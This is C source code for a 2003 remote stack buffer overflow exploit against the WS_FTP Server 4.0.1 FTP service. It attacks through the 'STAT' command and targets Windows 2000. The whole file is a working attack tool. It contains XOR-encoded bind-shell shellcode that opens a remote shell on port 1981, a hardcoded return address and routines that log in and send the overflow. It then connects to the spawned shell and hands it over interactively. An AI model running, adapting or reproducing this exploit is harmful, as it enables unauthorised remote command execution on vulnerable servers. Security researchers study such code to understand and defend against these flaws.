/* 
* http://www.k-otiK.com/exploits/x-ws_ftp.c 
* 
* x-ws_ftp.c - x86/win32 WS_FTP FTPD "STAT" command remote
* stack buffer overflow exploit
*
* (C) COPYRIGHT XFOCUS Security Team, 2003
* All Rights Reserved
*
* -----------------------------------------------------------------------
* Author : eyas <eyas@xfocus.org>
* : http://www.xfocus.org
* Maintain : XFOCUS Security Team <security@xfocus.org>
* Version : 1.0
*
* Test : Windows 2000 server EN
* + WS_FTP Server 4.0.1.EVAL (46006050)
* Notes : This vul discover by Dvdman@l33tsecurity.com!
* To exploit this vul, you must have a account can login into ws_ftp.
* Greets : dvdman and all member of XFOCUS Security Team.
* Complie : cl x-ws_ftp.c
* Usage : x-ws_ftp.exe <-i ip> <-t type> <-u user> <-p pass> [-l pathlen] [-P port]
* [type]
* 0 win2k sp4 user32.dll
*
* Add more targets's jmp esp addr by yourself,
* and then pls email a copy to me, thanks. :)
*
* Date : 2003-10-08
* Revised :
*
* Revise History:
* 
* ------- start rip from dvdman's exp -----------------
* VULN VERSIONS: <= X2 WS_FTP Server 4.0.1 (1323562169)
* VULN COMMANDS: APPE,STOR,STAT,RMD,RNFR,RNTO,AND MORE
* -------- rip end ------------------------------------
*/ 
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib,"ws2_32")

#define maxlen (0x200-1)//???????????
#define overpoint (0x118+4)//???
#define sc_jmp_addr_offset (0xa4+22)//sc???jmp addr?offset
#define mini_path 0xf//????

#define ERR_EXP_OK 0
#define ERR_EXP_CONNECT -1
#define ERR_EXP_FAILED 1

#define version "1.0"
//modify it by yourself
struct
{
DWORD dwJMP;
char *szDescription;
}targets[] = 
{
{0x77E14C29, "win2k sp4 user32.dll"},
},v;


//total = 366 (0x16E) bytes (xor with 0x93)
unsigned char sc_bind_1981[]=
//decoder 22 bytes ->???????sc??
"\xEB\x0F\x5B\x80\x33\x93\x43\x81\x3B\x45\x59\x34\x53\x75\xF4\x74"
"\x05\xE8\xEC\xFF\xFF\xFF"
//sc_bind_1981 for 2k/xp/2003 by ey4s
//speacial version for ws_ftp base on v1.03.10.07
//XOR with 0x93 (367 0x16F bytes)
"\x12\x7F\x93\x91\x93\x93\x7A\xA4\x92\x93\x93\xCC\xF7\x32\xA3\x93"
"\x93\x93\x18\xD3\x9F\x18\xE3\x8F\x3E\x18\xFB\x9B\xF9\x97\xCA\x7B"
"\x4A\x93\x93\x93\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC"
"\xC7\x6C\xC4\x6F\x18\x7B\xF9\x95\xCA\x7B\x2C\x93\x93\x93\x71\x6A"
"\x12\x7F\x03\x92\x93\x93\xC7\xFB\x91\x91\x93\x93\x6C\xC4\x7B\xC3"
"\xC3\xC3\xC3\xF9\x92\xF9\x91\x6C\xC4\x63\x18\x4B\x18\x7F\x54\xD6"
"\x93\x91\x93\x94\x2E\xA0\x53\x1A\xD6\x97\xF9\x83\xC6\xC0\x6C\xC4"
"\x67\xC0\xF9\x92\xC0\x6C\xC4\x6B\xC3\xC3\xC0\x6C\xC4\x6F\xC3\x10"
"\x7F\xCB\x18\x67\xA0\x48\xF9\x83\xCA\x1A\x8F\x1D\x71\x68\x78\xBF"
"\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3"
"\xD3\xD3\xD3\xD3\x03\x03\x03\x03\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3"
"\xE9\x35\xFF\xFF\xFF\xD3\xD3\xD3\xD3\xD3\xD3\xD3\x1A\xD5\xAB\x1A"
"\xD5\xAF\x1A\xD5\xD3\x54\xD5\xBF\x92\x92\x93\x93\x1E\xD5\xD7\xC3"
"\xC5\xC0\xC0\xC0\xF9\x92\xC0\xC0\x1E\xD5\xC7\x54\x93\xF0\xFE\xF7"
"\x93\xC3\xC0\x6C\xC4\x73\xA0\x53\xDB\xC3\x6C\xE5\xD7\x6C\xC4\x4F"
"\x10\x57\xCB\x6C\xC4\x7F\x6C\xC4\x7F\xC3\x6C\xC4\x4B\xC2\x18\xE6"
"\xAF\x18\xE7\xBD\xEB\x90\x66\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA"
"\xD2\x3E\x90\x56\xA0\x48\xA0\x41\x9C\x2D\x83\xA9\x45\xE7\x9B\x52"
"\x58\x88\x90\x49\xD3\x78\x7C\xA8\x8C\xE6\x76\xCD\x18\xCD\xB7\x90"
"\x4E\xF5\x18\x9F\xD8\x18\xCD\x8F\x90\x4E\x18\x97\x18\x90\x56\x38"
"\xCA\x50\x7B\x57\x6D\x6C\x6C\x7A\x28\x50\x3D\x27\xEE\x86\x0B\x58"
"\xD1\xE4\x2B\x4F\x4E\x89\xA0\xBE\x87\xC5\x3D\x55\xB8\x2E\xBD\x4D"
"\xC4\xE1\x37\xB7\x21\xA1\x93\x9D\xCE\x58\x4D\xE7\xB1\xF0\x5B"
//decode end sign
"\x45\x59\x34\x53";

unsigned char *szSend[3];
unsigned char szSTAT[0x1000];
int iType;
int iPort=21;
char *ip=NULL, *pUser=NULL, *pPass=NULL;
char user[128],pass[128];

void shell (int sock);
void usage(char *p);
int SendExploit(int iPathLen);
void main(int argc, char **argv)
{
int i, iPathLen=0, ret;

printf( "WS_FTP FTPD remote stack buffer overflow exp v%s\n"
"This version can exploit WS_FTP Server 4.0.1.EVAL\n"
"Vul discover by Dvdman@l33tsecurity.com\n"
"Code by eyas@xfocus.org\n"
"http://www.xfocus.net\n"
"Create: 2003-10-08\n", version);

if(argc < 9)
{
usage(argv[0]);
return;
}

for(i=1;i<argc;i+=2)
{
if(strlen(argv[i]) != 2)
{
usage(argv[0]);
return;
}
//????????
if(i == argc-1)
{
usage(argv[0]);
return;
}
switch(argv[i][1])
{
case 'i':
ip=argv[i+1];
break;
case 't':
iType = atoi(argv[i+1]);
break;
case 'P':
iPort=atoi(argv[i+1]);
break;
case 'p':
pPass = argv[i+1];
break;
case 'u':
pUser=argv[i+1];
break;
case 'l':
iPathLen=atoi(argv[i+1]);
break;
}
}

if((!ip) || (!user) || (!pass))
{
usage(argv[0]);
printf("[-] Invalid parameter.\n");
return;
}
if( (iType<0) || (iType>=sizeof(targets)/sizeof(v)) )
{
usage(argv[0]);
printf("[-] Invalid type.\n");
return;
}

if( (iPathLen>0) && (iPathLen<mini_path) )
{
printf("[-] Hey, guy, mini path is %d.\n", mini_path);
return;
}

_snprintf(user, sizeof(user)-1, "USER %s\r\n", pUser);
user[sizeof(user)-1]='\0';
_snprintf(pass, sizeof(pass)-1, "PASS %s\r\n", pPass);
pass[sizeof(pass)-1]='\0';
szSend[0] = user;//user
szSend[1] = pass;//pass
szSend[2] = szSTAT;

if(iPathLen)
SendExploit(iPathLen);
else
{
for(i=mini_path;;i++)
{
ret = SendExploit(i);
switch(ret)
{
case ERR_EXP_FAILED:
break;
case ERR_EXP_CONNECT:
case ERR_EXP_OK:
return;
break;
}
}
}
return;
}
/* ripped from TESO code and modifed by ey4s for win32 */
void shell (int sock)
{
int l;
char buf[512];
struct timeval time;
unsigned long ul[2];

time.tv_sec = 1;
time.tv_usec = 0;

while (1) 
{
ul[0] = 1;
ul[1] = sock;

l = select (0, (fd_set *)&ul, NULL, NULL, &time);
if(l == 1)
{
l = recv (sock, buf, sizeof (buf), 0);
if (l <= 0) 
{
printf ("[-] Connection closed.\n");
return;
}
l = write (1, buf, l);
if (l <= 0) 
{
printf ("[-] Connection closed.\n");
return;
}
}
else
{
l = read (0, buf, sizeof (buf));
if (l <= 0) 
{
printf("[-] Connection closed.\n");
return;
}
l = send(sock, buf, l, 0);
if (l <= 0) 
{
printf("[-] Connection closed.\n");
return;
}
}
}
}
void usage(char *p)
{
int i;
printf( "Usage: %s <-i ip> <-t type> <-u user> <-p pass> [-l pathlen] [-P port]\n"
"[type]\n", p);
for(i=0;i<sizeof(targets)/sizeof(v);i++)
{
printf("%d\t%s\n", i, targets[i].szDescription);
}
}
int SendExploit(int iPathLen)
{
struct sockaddr_in sa, server;
WSADATA wsd;
SOCKET s,s2;
int i,iErr, ret, pad1,pad2;
char szRecvBuff[0x1000];
int retcode = ERR_EXP_CONNECT;

printf("\n[+] -=-= Try type %d, path %d. -=-=\n", iType, iPathLen);

memcpy(&sc_bind_1981[sc_jmp_addr_offset], &targets[iType].dwJMP, 4);

memset(szSTAT, 0, sizeof(szSTAT));
strcpy(szSTAT, "STAT ");
//????????????
//??path????,??buff????0x200,??????:)
pad1 = overpoint - sc_jmp_addr_offset - iPathLen;
if(pad1<0)
{
printf( "[-] You can't try any more, path reach the max vaule.\n"
" If you want to try longer path, change the sc by 
yourself.\n");
exit(1);
}
for(i=0;i<pad1;i++)
strcat(szSTAT, "a");
strcat(szSTAT, sc_bind_1981);
//???????????
pad2 = maxlen - overpoint;
//???????
pad2 -= (sizeof(sc_bind_1981)-1-sc_jmp_addr_offset);
if(pad2<0)
{
printf("[-] shellcode too long.\n");
exit(1);
}
for(i=0;i<pad2;i++)
strcat(szSTAT, "b");
strcat(szSTAT, "\r\n");
if(strlen(szSTAT) >= sizeof(szSTAT))
{
printf("[-] stack buffer overflow.\n");
exit(1);
}
__try
{
if (WSAStartup(MAKEWORD(1,1), &wsd) != 0)
{
printf("[-] WSAStartup error:%d\n", WSAGetLastError());
__leave;
}

s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if(s == INVALID_SOCKET)
{
printf("[-] Create socket failed:%d",GetLastError());
__leave;
}

sa.sin_family=AF_INET;
sa.sin_port=htons(iPort);
sa.sin_addr.S_un.S_addr=inet_addr(ip);

iErr = connect(s,(struct sockaddr *)&sa,sizeof(sa));
if(iErr == SOCKET_ERROR)
{
printf("[-] connect to target:21 error:%d\n", GetLastError());
__leave;
}
printf("[+] connect to %s:%d success.\n", ip, iPort);
Sleep(1000);
for(i=0;i<sizeof(szSend)/sizeof(szSend[0]);i++)
{
memset(szRecvBuff, 0, sizeof(szRecvBuff));
iErr = recv(s, szRecvBuff, sizeof(szRecvBuff), 0);
if(iErr == SOCKET_ERROR)
{
printf("[-] recv buffer error:%d.\n", WSAGetLastError());
__leave;
}
printf("[+] Recv: %s", szRecvBuff);
iErr = send(s, szSend[i], strlen(szSend[i]),0);
if(iErr == SOCKET_ERROR)
{
printf("[-] send buffer error:%d.\n", WSAGetLastError());
__leave;
}
if(i==sizeof(szSend)/sizeof(szSend[0])-1)
printf("[+] Send shellcode %d(0x%X) bytes.\n", iErr, iErr);
else
printf("[+] Send: %s", szSend[i]);
Sleep(100);
} 
printf("[+] Wait from shell.\n");
Sleep(2000);
s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
server.sin_family = AF_INET;
server.sin_port = htons(1981);
server.sin_addr.s_addr=inet_addr(ip);
ret = connect(s2, (struct sockaddr *)&server, sizeof(server));
if(ret!=0)
{
printf("[-] Exploit seem failed.\n");
retcode = ERR_EXP_FAILED;
__leave;
}
printf("[+] Exploit success! Have fun! :)\n");
shell(s2);
retcode = ERR_EXP_OK;
}
__finally
{
if(s != INVALID_SOCKET) closesocket(s);
if(s2 != INVALID_SOCKET) closesocket(s);
WSACleanup();
}
return retcode;
}

